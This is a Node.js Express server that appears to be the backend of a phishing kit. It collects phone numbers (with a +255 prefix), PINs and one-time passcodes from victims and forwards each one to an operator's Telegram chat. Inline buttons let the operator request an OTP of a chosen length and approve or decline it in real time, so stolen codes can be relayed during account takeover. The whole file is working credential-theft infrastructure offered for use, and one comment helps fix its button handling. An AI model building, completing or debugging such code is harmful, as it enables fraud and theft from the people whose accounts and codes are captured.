const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000; // Render uses process.env.PORT

app.use(cors());
app.use(bodyParser.json());

const sessions = {};

const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; 
const TELEGRAM_ADMIN_ID = "YOUR_CHAT_ID";

// 1. Initial PIN Submission
app.post('/api/submit', async (req, res) => {
    const { phone, pin, sessionId } = req.body;
    sessions[sessionId] = { phone, pin, status: 'waiting_admin' };

    const message = `🚀 *New Login*\nPhone: +255${phone}\nPIN: ${pin}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "Ask OTP (5)", callback_data: `ask_5_${sessionId}` },
                    { text: "Ask OTP (6)", callback_data: `ask_6_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// 2. The Webhook (This is why your buttons weren't working)
app.post('/api/webhook', async (req, res) => {
    const body = req.body;
    
    if (body.callback_query) {
        const data = body.callback_query.data;
        const [action, value, sid] = data.split('_');

        if (sessions[sid]) {
            if (action === 'ask') {
                sessions[sid].status = `go_otp_${value}`; // e.g., go_otp_5
            } else if (action === 'accept') {
                sessions[sid].status = 'approved';
            } else if (action === 'decline') {
                sessions[sid].status = 'declined';
            }
        }

        // Always answer the callback so the "loading" icon on the button goes away
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id,
            text: "Action Received"
        });
    }
    res.sendStatus(200);
});

// 3. Status Polling
app.get('/api/status/:sessionId', (req, res) => {
    const session = sessions[req.params.sessionId];
    res.json(session ? { status: session.status } : { status: 'idle' });
});

// 4. Submit OTP
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: msg,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    }
});

app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
